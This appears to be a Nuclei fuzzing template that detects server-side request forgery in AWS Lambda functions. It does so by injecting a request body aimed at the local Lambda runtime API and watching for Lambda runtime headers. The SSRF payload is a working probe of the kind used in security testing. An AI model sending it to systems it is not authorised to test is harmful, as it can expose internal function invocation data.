http:
- fuzzing:
  - fuzz:
    - '{{ssrf}}'
    mode: single
    part: body
    type: replace
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - Lambda-Runtime-Aws-Request-Id
    - Lambda-Runtime-Deadline-Ms
  payloads:
    ssrf:
    - http://localhost:9001/2018-06-01/runtime/invocation/next
  pre-condition:
  - dsl:
    - method == "POST"
    - method == "PUT"
    - method == "PATCH"
    - method == "DELETE"
    type: dsl
  stop-at-first-match: true
id: lambda-ssrf
info:
  author: reewardius
  name: Lambda SSRF Detection
  reference:
  - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
  - https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40
  - https://twitter.com/hacker_/status/1694554718574710865
  severity: high
  tags: ssrf,dast,fuzzing-req-ssrf,fuzzing-req-ssrf-body,fuzzing-req-body
